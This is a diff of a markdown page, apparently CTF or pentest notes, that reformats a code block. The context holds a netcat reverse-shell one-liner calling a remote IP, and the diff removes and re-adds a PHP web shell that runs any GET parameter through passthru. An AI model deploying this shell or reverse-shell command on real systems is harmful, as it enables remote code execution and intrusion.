@@ -49,13 +49,13 @@ In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse
 {% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The sample php shell code from `evilshell.php` is as below.
-{% capture code %}<?php
-  if (isset($_GET["commandString"])) {
-    $command_string = $_GET["commandString"];
-    try { passthru($command_string); }
-    catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
-  }
-?>{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}<?php
+    if (isset($_GET["commandString"])) {
+        $command_string = $_GET["commandString"];
+        try { passthru($command_string); }
+        catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
+    }
+?>{% endraw %}{% endcapture %} {% include code.html code=code lang="php"%}
 
 To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 
